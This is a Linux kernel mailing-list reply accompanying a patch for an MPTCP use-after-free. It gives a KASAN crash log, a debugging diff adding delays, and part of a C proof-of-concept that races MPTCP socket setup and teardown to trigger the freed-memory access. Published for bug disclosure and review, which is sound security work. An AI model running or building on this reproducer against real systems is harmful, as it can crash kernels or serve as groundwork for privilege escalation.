Received: from mail-pf1-f176.google.com (mail-pf1-f176.google.com [209.85.210.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D0CDD43CEE7
	for <mptcp@lists.linux.dev>; Thu, 20 Aug 2026 12:05:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787227556; cv=none; b=f953l7K0+8L9LwWDdCdr6NDAvo/Em0mx0MNmqOdjXtBAWv//V3TRJzqnJb7Ubwzx9nAPW21gpfDqnei9fC9yiyS+7UQrc2gWF6i3Wo+U8VH5PtFYwHMi2BpAWmw3izlpQI8FrLbrvpOVzrYVh8qv9+qqtStbXbaBRDZSPYAMTFQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787227556; c=relaxed/simple;
	bh=vXN5q8UZBhxu5v0nrV3+//M/vucxFc9IOo27Yre9TOo=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=JmRr9x5kNv9b/hM4zkyO4sgbx9Zh6saSeqlml1U2gUx+k9iERsh28qcu6c5XQDWqDPC9yl5i8o7wn8QhdsXHNmqLOOfojcpnaP0F/5hWZsuHtShNUOTbk8KQzugel+oMZEcRqPz32GyMAf9g7UW44GFrF4+ZKOV9eDKaVCpUvqY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=IBOapBDV; arc=none smtp.client-ip=209.85.210.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="IBOapBDV"
Received: by mail-pf1-f176.google.com with SMTP id d2e1a72fcca58-84a2c90e383so582783b3a.0
        for <mptcp@lists.linux.dev>; Thu, 20 Aug 2026 05:05:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1787227553; x=1787832353; darn=lists.linux.dev;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=witRPrWC2gw73n9dwQEj0MxngxoBUloUhkmIoj5E2t0=;
        b=IBOapBDV997+0zwXle/d2to4FZ+haXYS800ZnL7WqTgbllI6gWmhuuq1EQo4KBe9jQ
         Pz22smrYbhu+6rglJxrlZm0IjS5iVYW0OxkIlJOQ3XdKjpPwuTZlYc2YPMDM1jw/EuZA
         eTpZEP1Jx/7Mt/JG+CxeANmpEvXmXo2wnHOLq7i0DCUzjjhXh3D52ZX5jVdEs15Xkp//
         LjUTO1ELIqaNEhpEtyya33123NvSUQMa2Pt7r8lOzYoo15zNCruD3L2wHgdCY5MqyIhR
         M5e+PT1yYEEoesHrZzjl//d7iK0wrsBRLOd2bendEC7E2n7s8tdZ+35f1zHXh66EGsRc
         smRg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787227553; x=1787832353;
        h=in-reply-to:content-disposition:content-type:mime-version
         :references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=witRPrWC2gw73n9dwQEj0MxngxoBUloUhkmIoj5E2t0=;
        b=Q+HF55wopUKCL9bMaz3T5QXSsRQBdByiG44qCmo3yQnFwCnzQ/uQRVwTg1Ub5OzXtu
         Xfj7KipaWWfMTaZjxce2Q3I4AumYeVFC3Wdnh8TsUcq2e0bKpmFZ5ZOh8nXyalYin+Gy
         DipVseGJbaiLPDj1Zoo+WX0ZU+n2eAXbZhHjG7jzdLa9SBkV33YpsDSSlLNvTx01NF4t
         95PMygU5PQKT5kYITle1fwvq8pCZpnHRGFaz+crxuJDnTgGxye975ENwuAy2dkBdWyT+
         K+eKOXuRY4jtagJkDTDPvhI206v2uyOCJ75oefcmcjCuetgorkoPfgvOAnJuMcjzNJFj
         mTMg==
X-Forwarded-Encrypted: i=1; AHgh+RrBAagjTPZ7FwRkHu65+feqq6/pImUO1z1dJh7mX+ro9ELdzOIka2J2UcAu9j5C/OnDXEzd2g==@lists.linux.dev
X-Gm-Message-State: AOJu0YwEvo5qgHiVwvZMbr//2NlYE6JQGNZO4q9R7vlv0Z5SaKCc7HSX
	m8vkT7DYpXrlRxApGpOoqib1a0GrkompFNgIaVpSdrZdI93OcKqtA3rL
X-Gm-Gg: AR+sD130uPFRmAwD3A02VEW8IuZAJEG1P/012wFTNeYgF8wmPnF1Z/q3qpToEVwtS4+
	5ikBt4RGEe54gRGEWWChjbvX8Y4X2gM2FfK8uh/uwgpCaDBE4vcPq2YiA3JtpAh4xIsC/NtFGCF
	tulDuPWzVHQAi6ATNraub0bZip8+SlPgcXPBkVTMaqhRM7AgTppT+hZvw0/QphZ1cQ38vDiiSx/
	BHB4esGSbSYIFsms28aTduKDOvMb2pcxn1150A/a/n1v8M9P12ONy/+qhZHmS0S2by1YTGm8z7U
	TEBoyhbjtCCk9B9nUWZlkAfTBHiVezHcNrF7d7e8hLOsJa2b272/w77coOkX2Xne8anUYLI/99z
	x2RsxdSIq8VzdZDwmDqLda2v8p/FJPbz30yhAM9xch8cN1rTfVRd5s4XDncu6N5NQPqFqa5hqJw
	NNdtyVbVeI0iAsJdayJmgt2BPDmFC+qdZtTzklHUjDYXCL63W6mCnthU4Ut51LrIbAsNP9c5QSU
	JjJ3BM5
X-Received: by 2002:a05:6a00:228d:b0:84f:6f7e:493 with SMTP id d2e1a72fcca58-851df912147mr5787939b3a.3.1787227552701;
        Thu, 20 Aug 2026 05:05:52 -0700 (PDT)
Received: from v4bel ([58.123.110.97])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-851d366efa5sm1559294b3a.55.2026.08.20.05.05.49
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 20 Aug 2026 05:05:51 -0700 (PDT)
Date: Thu, 20 Aug 2026 21:05:47 +0900
From: Hyunwoo Kim <imv4bel@gmail.com>
To: Matthieu Baerts <matttbe@kernel.org>
Cc: martineau@kernel.org, geliang@kernel.org, pabeni@redhat.com,
	mptcp@lists.linux.dev, netdev@vger.kernel.org, imv4bel@gmail.com
Subject: Re: [PATCH net] mptcp: fix use-after-free of the subflow context on
 the delegated list
Message-ID: <aobtmznTdBks0frM@v4bel>
References: <aoWBrkNwebJe-koh@v4bel>
 <bf25121c-72cf-40a7-bbaf-5db85aee7f59@kernel.org>
Precedence: bulk
X-Mailing-List: mptcp@lists.linux.dev
List-Id: <mptcp.lists.linux.dev>
List-Subscribe: <mailto:mptcp+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:mptcp+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <bf25121c-72cf-40a7-bbaf-5db85aee7f59@kernel.org>

On Wed, Aug 19, 2026 at 12:22:18PM +0200, Matthieu Baerts wrote:
> Hi Hyunwoo,
> 
> On 19/08/2026 12:13, Hyunwoo Kim wrote:
> > mptcp_subflow_delegate() links the subflow context into a per-CPU napi
> > list and takes a reference on the subflow socket. The context is a
> > separate allocation, reached through icsk_ulp_data, and the list holds
> > no reference to it.
> > 
> > inet_csk_destroy_sock() runs sk_prot->destroy() regardless of the
> > outstanding references. That path ends in tcp_cleanup_ulp(), which calls
> > subflow_ulp_release(). subflow_ulp_release() frees the context with
> > kfree_rcu() but does not remove it from the list. Once the grace period
> > elapses and the context is actually freed, the next mptcp_napi_poll()
> > dequeues that entry and mptcp_subflow_delegated_next() writes to the
> > freed context with list_del_init(). That is the use-after-free.
> > 
> > The freeing path cannot dequeue the entry itself: the list is per-CPU
> > and only the CPU that queued the subflow may touch it, as
> > tcp_release_cb_override() already notes.
> > 
> > Delay the free instead. Add MPTCP_DELEGATE_DEAD.
> > mptcp_subflow_free_ctx() sets it and frees the context only if the
> > subflow is not scheduled, while mptcp_napi_poll() frees it if the dead
> > bit is set when it clears the scheduled bit. Either
> > mptcp_subflow_free_ctx() gets there first, sees the scheduled bit and
> > leaves the free to mptcp_napi_poll(), or mptcp_napi_poll() gets there
> > first, does not see the dead bit and mptcp_subflow_free_ctx() does the
> > free.
> > 
> > Also skip mptcp_subflow_process_delegated() once the dead bit is set.
> > subflow_ulp_release() has already dropped the msk reference by then, so
> > the pending actions must not run.
> > 
> > Finally, move delegated_status out of struct_group(reset).
> > mptcp_subflow_ctx_reset() clears that group on disconnect, and clearing
> > the scheduled bit while the entry is still queued would let
> > mptcp_subflow_free_ctx() free a context the napi list still points to.
> > delegated_node is already outside the group.
> Thank you for looking at this. Do you have more context about how the
> bug was discovered? Do you have a reproducer and/or a KASAN calltrace or
> similar?
> 
> Having this would help the reviewers.

Sorry for the late reply. The poc was extremely unstable, so I wanted 
to improve its reproduction rate a bit before sending it.

Attached are the poc, the KASAN log, and the mdelay diff used for 
reproduction.


Best regards,
Hyunwoo Kim

---

KASAN log:

[  220.351834] ==================================================================
[  220.352257] BUG: KASAN: slab-use-after-free in __list_del_entry_valid_or_report+0x14/0x140
[  220.352686] Read of size 8 at addr ffff888102e45cc8 by task w/160
[  220.353004]
[  220.353096] CPU: 3 UID: 65534 PID: 160 Comm: w Not tainted 7.2.0-rc7-gf5bbbfec59b4-dirty #245 PREEMPT(lazy)
[  220.353099] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  220.353102] Call Trace:
[  220.353107]  <IRQ>
[  220.353109]  dump_stack_lvl+0x78/0xe0
[  220.353114]  print_report+0xf4/0x610
[  220.353119]  ? preempt_count_sub+0x18/0xd0
[  220.353123]  ? __virt_addr_valid+0x1b0/0x350
[  220.353126]  ? __phys_addr+0x46/0x90
[  220.353130]  ? __list_del_entry_valid_or_report+0x14/0x140
[  220.353132]  kasan_report+0xe0/0x110
[  220.353136]  ? __list_del_entry_valid_or_report+0x14/0x140
[  220.353141]  __list_del_entry_valid_or_report+0x14/0x140
[  220.353145]  mptcp_napi_poll+0x17c/0x530
[  220.353151]  trace_clock_x86_tsc+0x20/0x20
[  220.353156]  net_rx_action+0x33f/0x760
[  220.353162]  ? do_raw_spin_unlock+0x9a/0x100
[  220.353165]  ? __pfx_net_rx_action+0x10/0x10
[  220.353167]  ? _raw_spin_unlock_irqrestore+0x40/0x80
[  220.353174]  ? tmigr_handle_remote+0x15d/0x210
[  220.353181]  ? run_timer_base+0xcf/0x120
[  220.353184]  ? __pfx_run_timer_base+0x10/0x10
[  220.353188]  handle_softirqs+0x165/0x700
[  220.353194]  ? __pfx_handle_softirqs+0x10/0x10
[  220.353197]  ? __flush_smp_call_function_queue+0x223/0x420
[  220.353202]  __irq_exit_rcu+0x112/0x1a0
[  220.353204]  irq_exit_rcu+0xe/0x30
[  220.353206]  sysvec_call_function+0x90/0xb0
[  220.353210]  </IRQ>
[  220.353211]  <TASK>
[  220.353212]  asm_sysvec_call_function+0x1a/0x20
[  220.353215] RIP: 0010:_raw_spin_unlock_irqrestore+0x36/0x80
[  220.353218] Code: f5 53 48 8b 74 24 10 48 89 fb 48 83 c7 18 e8 21 fd ac fd 48 89 df e8 b9 44 ad fd f7 c5 00 02 00 00 75 23 9c 58 f6 c4 02 75 37 <bf> 01 00 00 00 e8 f0 f1 a4 fd 65 8b 05 d9 f0 cb 03 85 c0 74 16 5b
[  220.353220] RSP: 0018:ffffc90000f2fc10 EFLAGS: 00000246
[  220.353222] RAX: 0000000000000002 RBX: ffff8881015e2900 RCX: 0000000000000080
[  220.353223] RDX: 0000000000000000 RSI: ffffffff84b6d450 RDI: ffffffff83f21980
[  220.353225] RBP: 0000000000000282 R08: 0000000000000001 R09: 0000000000000001
[  220.353226] R10: ffffffff8626fb57 R11: ffff8880113dbac0 R12: ffff8881092c8740
[  220.353228] R13: 0000000000000000 R14: ffffc90000f2fc58 R15: 00000000ffffffff
[  220.353235]  qlist_free_all+0x47/0xf0
[  220.353239]  kasan_quarantine_reduce+0x195/0x1e0
[  220.353242]  __kasan_slab_alloc+0x4e/0x70
[  220.353246]  kmem_cache_alloc_noprof+0x242/0x670
[  220.353249]  ? security_file_alloc+0x28/0xb0
[  220.353255]  security_file_alloc+0x28/0xb0
[  220.353258]  init_file+0x5b/0x210
[  220.353263]  alloc_empty_file+0x61/0x140
[  220.353267]  alloc_file_pseudo+0x123/0x1c0
[  220.353270]  ? __pfx_alloc_file_pseudo+0x10/0x10
[  220.353273]  ? preempt_count_sub+0x18/0xd0
[  220.353275]  ? _raw_spin_unlock+0x2d/0x50
[  220.353278]  ? alloc_fd+0x213/0x360
[  220.353282]  sock_alloc_file+0x45/0x110
[  220.353286]  __sys_socket+0x135/0x180
[  220.353290]  ? __pfx___sys_socket+0x10/0x10
[  220.353292]  ? xfd_validate_state+0x39/0xc0
[  220.353298]  __x64_sys_socket+0x40/0x50
[  220.353301]  do_syscall_64+0x115/0x6c0
[  220.353305]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  220.353308] RIP: 0033:0x423a3b
[  220.353311] Code: c7 c2 b8 ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa b8 29 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
[  220.353313] RSP: 002b:00007fbb93b551f8 EFLAGS: 00000297 ORIG_RAX: 0000000000000029
[  220.353315] RAX: ffffffffffffffda RBX: 000000000000000c RCX: 0000000000423a3b
[  220.353316] RDX: 0000000000000106 RSI: 0000000000000001 RDI: 0000000000000002
[  220.353317] RBP: 00007fbb93b55208 R08: 0000000000000000 R09: 0000000000000000
[  220.353318] R10: 0000000000004000 R11: 0000000000000297 R12: 00007fbb93ca56c0
[  220.353320] R13: ffffffffffffffb8 R14: 0000000000000000 R15: 00007ffdbd37eb70
[  220.353326]  </TASK>
[  220.353327]
[  220.371136] Allocated by task 155:
[  220.371304]  kasan_save_stack+0x33/0x60
[  220.371491]  kasan_save_track+0x14/0x30
[  220.371677]  __kasan_kmalloc+0x8f/0xa0
[  220.371859]  __kmalloc_cache_noprof+0x2bf/0x6a0
[  220.372077]  subflow_create_ctx+0x60/0x160
[  220.372276]  subflow_ulp_init+0x54/0x220
[  220.372466]  tcp_set_ulp+0x190/0x410
[  220.372642]  mptcp_subflow_create_socket+0x241/0x4f0
[  220.372879]  __mptcp_nmpc_sk+0x106/0x3d0
[  220.373070]  mptcp_connect+0x44/0x4b0
[  220.373251]  __inet_stream_connect+0x22c/0x710
[  220.373466]  inet_stream_connect+0x48/0x70
[  220.373663]  __sys_connect+0x101/0x130
[  220.373846]  __x64_sys_connect+0x40/0x50
[  220.374035]  do_syscall_64+0x115/0x6c0
[  220.374219]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  220.374460]
[  220.374542] Freed by task 156:
[  220.374694]  kasan_save_stack+0x33/0x60
[  220.374880]  kasan_save_track+0x14/0x30
[  220.375066]  kasan_save_free_info+0x3b/0x60
[  220.375269]  __kasan_slab_free+0x43/0x70
[  220.375459]  kvfree_rcu_cb+0x26a/0x650
[  220.375641]  rcu_core+0x4ff/0xe40
[  220.375807]  handle_softirqs+0x165/0x700
[  220.375997]  __irq_exit_rcu+0x112/0x1a0
[  220.376185]  irq_exit_rcu+0xe/0x30
[  220.376353]  sysvec_apic_timer_interrupt+0x90/0xb0
[  220.376582]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[  220.376826]
[  220.376908] Last potentially related work creation:
[  220.377142]  kasan_save_stack+0x33/0x60
[  220.377328]  kasan_record_aux_stack+0x8c/0xa0
[  220.377539]  __call_rcu_common.constprop.0+0x81/0x7f0
[  220.377780]  tcp_cleanup_ulp+0x45/0x90
[  220.377962]  tcp_v4_destroy_sock+0x147/0x3b0
[  220.378171]  inet_csk_destroy_sock+0xaf/0x1c0
[  220.378382]  __tcp_close+0x6bb/0x7d0
[  220.378557]  __mptcp_close_ssk+0x242/0x910
[  220.378755]  mptcp_destroy_common+0xeb/0x1e0
[  220.378961]  mptcp_destroy+0x3f/0x80
[  220.379138]  __mptcp_destroy_sock+0xd3/0x1f0
[  220.379345]  __mptcp_close+0x3fc/0x5c0
[  220.379527]  mptcp_close+0x23/0x90
[  220.379694]  inet_release+0x93/0x100
[  220.379869]  __sock_release+0x66/0x130
[  220.380051]  sock_close+0x18/0x20
[  220.380217]  __fput+0x1f0/0x4c0
[  220.380373]  fput_close_sync+0xd2/0x190
[  220.380559]  __x64_sys_close+0x55/0x90
[  220.380742]  do_syscall_64+0x115/0x6c0
[  220.380925]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  220.381166]
[  220.381248] Second to last potentially related work creation:
[  220.381519]  kasan_save_stack+0x33/0x60
[  220.381705]  kasan_record_aux_stack+0x8c/0xa0
[  220.381917]  kvfree_call_rcu+0x1e/0x60
[  220.382100]  tcp_cleanup_ulp+0x45/0x90
[  220.382287]  tcp_v4_destroy_sock+0x147/0x3b0
[  220.382494]  inet_csk_destroy_sock+0xaf/0x1c0
[  220.382704]  __tcp_close+0x6bb/0x7d0
[  220.382879]  __mptcp_close_ssk+0x242/0x910
[  220.383077]  mptcp_destroy_common+0xeb/0x1e0
[  220.383285]  mptcp_destroy+0x3f/0x80
[  220.383460]  __mptcp_destroy_sock+0xd3/0x1f0
[  220.383667]  __mptcp_close+0x3fc/0x5c0
[  220.383848]  mptcp_close+0x23/0x90
[  220.384015]  inet_release+0x93/0x100
[  220.384193]  __sock_release+0x66/0x130
[  220.384375]  sock_close+0x18/0x20
[  220.384538]  __fput+0x1f0/0x4c0
[  220.384695]  fput_close_sync+0xd2/0x190
[  220.384880]  __x64_sys_close+0x55/0x90
[  220.385063]  do_syscall_64+0x115/0x6c0
[  220.385247]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  220.385487]
[  220.385569] The buggy address belongs to the object at ffff888102e45c00
[  220.385569]  which belongs to the cache kmalloc-512 of size 512
[  220.386140] The buggy address is located 200 bytes inside of
[  220.386140]  freed 512-byte region [ffff888102e45c00, ffff888102e45e00)
[  220.386699]
[  220.386781] The buggy address belongs to the physical page:
[  220.387043] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x102e40
[  220.387416] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[  220.387771] flags: 0x200000000000040(head|node=0|zone=2)
[  220.388022] page_type: f5(slab)
[  220.388181] raw: 0200000000000040 ffff888100042f40 ffffea00041d4010 ffffea00041bd010
[  220.388540] raw: 0000000000000000 0000000800150015 00000000f5000000 0000000000000000
[  220.388899] head: 0200000000000040 ffff888100042f40 ffffea00041d4010 ffffea00041bd010
[  220.389263] head: 0000000000000000 0000000800150015 00000000f5000000 0000000000000000
[  220.389626] head: 0200000000000003 fffffffffffffe01 00000000ffffffff 00000000ffffffff
[  220.389989] head: ffffffffffffffff 0000000000000000 00000000ffffffff 0000000000000008
[  220.390353] page dumped because: kasan: bad access detected
[  220.390614]
[  220.390696] Memory state around the buggy address:
[  220.390924]  ffff888102e45b80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  220.391263]  ffff888102e45c00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  220.391599] >ffff888102e45c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  220.391935]                                               ^
[  220.392198]  ffff888102e45d00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  220.392534]  ffff888102e45d80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  220.392870] ==================================================================


mdelay diff:

diff --git a/net/ipv4/tcp_input.c b/net/ipv4/tcp_input.c
--- a/net/ipv4/tcp_input.c
+++ b/net/ipv4/tcp_input.c
@@ -6106,6 +6106,7 @@ static inline void tcp_data_snd_check(struct sock *sk)
 {
 	tcp_push_pending_frames(sk);
+	mdelay(1);
 	tcp_check_space(sk);
 }

diff --git a/net/mptcp/protocol.c b/net/mptcp/protocol.c
--- a/net/mptcp/protocol.c
+++ b/net/mptcp/protocol.c
@@ -4617,6 +4617,7 @@ static int mptcp_napi_poll(struct napi_struct *napi, int budget)
 	delegated = container_of(napi, struct mptcp_delegated_action, napi);
+	mdelay(200);
 	while ((subflow = mptcp_subflow_delegated_next(delegated)) != NULL) {

diff --git a/net/mptcp/protocol.h b/net/mptcp/protocol.h
--- a/net/mptcp/protocol.h
+++ b/net/mptcp/protocol.h
@@ -1024,6 +1024,7 @@ static inline void __mptcp_sync_sndbuf(struct sock *sk)
 	struct mptcp_subflow_context *subflow;
 	int ssk_sndbuf, new_sndbuf;
+	mdelay(8);

 	if (sk->sk_userlocks & SOCK_SNDBUF_LOCK)
 		return;

diff --git a/net/mptcp/subflow.c b/net/mptcp/subflow.c
--- a/net/mptcp/subflow.c
+++ b/net/mptcp/subflow.c
@@ -1540,7 +1540,9 @@ static void subflow_write_space(struct sock *ssk)
 	struct sock *sk = mptcp_subflow_ctx(ssk)->conn;

+	mdelay(2);
 	mptcp_propagate_sndbuf(sk, ssk);
+	mdelay(20);
 	mptcp_write_space(sk);
 }


PoC:

// CONFIG_KASAN=y, CONFIG_KASAN_GENERIC=y
// CONFIG_DEBUG_KERNEL=y, CONFIG_RCU_EXPERT=y
// CONFIG_RCU_STRICT_GRACE_PERIOD=y, CONFIG_NR_CPUS=4
// CONFIG_KVFREE_RCU_BATCHED is not set
// CONFIG_RPS=y

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef IPPROTO_MPTCP
#define IPPROTO_MPTCP 262
#endif
#ifndef MEMBARRIER_CMD_GLOBAL
#define MEMBARRIER_CMD_GLOBAL 1
#endif

#define WORKERS		8
#define CONC		8
#define BYTES		(1UL << 20)
#define CLOSE_US	100000
#define READER_US	1000
#define IDLE_US		700000
#define LOWAT		1
#define SPRAYERS	10
#define CLI_CPU		0
#define SRV_CPU		1
#define CLOSER_CPU	2
#define SPRAY_CPU	2
#define RX_CPUS		"8"
#define LO_MTU		1500

static uint16_t port;
static int listener;

static void die(const char *m) { perror(m); _exit(1); }

static void pin(int cpu)
{
	cpu_set_t s;

	if (cpu < 0)
		return;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof(s), &s);
}

static void sysfs_write(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0)
		return;
	(void)!write(fd, val, strlen(val));
	close(fd);
}

static void sysfs_show(const char *path)
{
	char b[64];
	int fd = open(path, O_RDONLY);
	ssize_t n;

	if (fd < 0)
		return;
	n = read(fd, b, sizeof(b) - 1);
	close(fd);
	if (n <= 0)
		return;
	while (n > 0 && (b[n - 1] == '\n' || b[n - 1] == ' '))
		n--;
	b[n] = 0;
	printf("%s = %s\n", path, b);
}

static void setup_env(void)
{
	struct ifreq ifr;
	int fd;

	sysfs_write("/sys/class/net/lo/queues/rx-0/rps_cpus", RX_CPUS "\n");

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd >= 0) {
		memset(&ifr, 0, sizeof(ifr));
		strcpy(ifr.ifr_name, "lo");
		ifr.ifr_mtu = LO_MTU;
		ioctl(fd, SIOCSIFMTU, &ifr);
		close(fd);
	}

	sysfs_show("/sys/class/net/lo/mtu");
	sysfs_show("/sys/class/net/lo/queues/rx-0/rps_cpus");
}

static void *gp_thread(void *p)
{
	(void)p;
	for (;;)
		syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, 0);
	return NULL;
}

#define CLOSEQ 8192
static int closeq[CLOSEQ];
static volatile unsigned long q_head, q_tail;
static pthread_mutex_t q_lock = PTHREAD_MUTEX_INITIALIZER;

static void close_later(int fd)
{
	pthread_mutex_lock(&q_lock);
	if (q_head - q_tail < CLOSEQ) {
		closeq[q_head % CLOSEQ] = fd;
		q_head++;
		fd = -1;
	}
	pthread_mutex_unlock(&q_lock);
	if (fd >= 0)
		close(fd);
}

static void *closer_thread(void *p)
{
	(void)p;
	pin(CLOSER_CPU);
	for (;;) {
		int fd = -1;

		pthread_mutex_lock(&q_lock);
		if (q_tail != q_head) {
			fd = closeq[q_tail % CLOSEQ];
			q_tail++;
		}
		pthread_mutex_unlock(&q_lock);
		if (fd >= 0) {
			static __thread unsigned long r = 12345;

			r = r * 1103515245UL + 12345UL;
			usleep(1000 + (r >> 16) % CLOSE_US);
			close(fd);
		} else {
			usleep(20);
		}
	}
	return NULL;
}

static void drain(int fd)
{
	static __thread char b[65536];

	for (;;) {
		ssize_t n = read(fd, b, sizeof(b));

		if (n > 0) {
			(void)send(fd, b, 16384, MSG_NOSIGNAL | MSG_DONTWAIT);
			usleep(READER_US);
			continue;
		}
		if (n < 0 && errno == EINTR)
			continue;
		break;
	}
	close(fd);
}

static void *reader_thread(void *p)
{
	drain((int)(intptr_t)p);
	return NULL;
}

static void peer_main(void)
{
	pthread_attr_t at;

	pin(SRV_CPU);
	pthread_attr_init(&at);
	pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);
	pthread_attr_setstacksize(&at, 128 * 1024);
	for (;;) {
		pthread_t th;
		int fd = accept(listener, NULL, NULL);

		if (fd < 0) {
			if (errno == EINTR)
				continue;
			_exit(0);
		}
		{
			int rb = 4 << 20;

			setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rb, sizeof(rb));
		}
		if (pthread_create(&th, &at, reader_thread,
				   (void *)(intptr_t)fd))
			close(fd);
	}
}

static void *spray_thread(void *p)
{
	struct sockaddr_in a = {
		.sin_family = AF_INET,
		.sin_port = htons(port),
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	struct linger l = { .l_onoff = 1, .l_linger = 0 };

	pin(SPRAY_CPU + (int)(long)p);
	for (;;) {
		int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_MPTCP);

		if (fd < 0) {
			usleep(1000);
			continue;
		}
		setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
		if (!connect(fd, (struct sockaddr *)&a, sizeof(a))) {
			static __thread char sb[1 << 18];
			unsigned int lw = 1;
			int fl = fcntl(fd, F_GETFL, 0);

			fcntl(fd, F_SETFL, fl | O_NONBLOCK);
			setsockopt(fd, IPPROTO_TCP, TCP_NOTSENT_LOWAT,
				   &lw, sizeof(lw));
			(void)send(fd, sb, 4096, MSG_NOSIGNAL);
		}
		close(fd);
	}
	return NULL;
}

static int mkconn(void)
{
	struct sockaddr_in a = {
		.sin_family = AF_INET,
		.sin_port = htons(port),
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	struct linger l = { .l_onoff = 1, .l_linger = 0 };
	int fd, one = 1, fl;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_MPTCP);
	if (fd < 0)
		return -1;
	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	while (connect(fd, (struct sockaddr *)&a, sizeof(a))) {
		if (errno == EINTR)
			continue;
		close(fd);
		return -1;
	}
	setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
	fl = fcntl(fd, F_GETFL, 0);
	fcntl(fd, F_SETFL, fl | O_NONBLOCK);
	return fd;
}

static volatile unsigned long n_cycles, n_eagain, n_conn;

static void one_cycle(int *fds)
{
	static __thread char buf[1 << 20];
	struct pollfd pfd[CONC];
	unsigned long i, spent;

	n_cycles++;

	for (i = 0; i < CONC; i++) {
		fds[i] = mkconn();
		if (fds[i] >= 0)
			n_conn++;
	}

	for (i = 0; i < CONC; i++) {
		unsigned long sent = 0;

		if (fds[i] < 0)
			continue;
		while (sent < BYTES) {
			ssize_t k = send(fds[i], buf, sizeof(buf), MSG_NOSIGNAL);

			if (k > 0) { sent += (unsigned long)k; continue; }
			if (k < 0 && errno == EINTR) continue;
			if (k < 0 && errno == EAGAIN) n_eagain++;
			break;
		}
	}

	for (i = 0; i < CONC; i++) {
		unsigned int lw = LOWAT;

		if (fds[i] >= 0)
			setsockopt(fds[i], IPPROTO_TCP, TCP_NOTSENT_LOWAT,
				   &lw, sizeof(lw));
	}

	for (i = 0; i < CONC; i++) {
		int sb = 512 * 1024;

		if (fds[i] >= 0)
			setsockopt(fds[i], SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
	}

	for (i = 0; i < CONC; i++)
		if (fds[i] >= 0)
			close_later(fds[i]);

	for (i = 0; i < CONC; i++) {
		pfd[i].fd = fds[i] >= 0 ? fds[i] : -1;
		pfd[i].events = POLLOUT;
	}
	for (spent = 0; spent < IDLE_US; spent += 2000)
		if (poll(pfd, CONC, 2) < 0 && errno != EINTR)
			break;
}

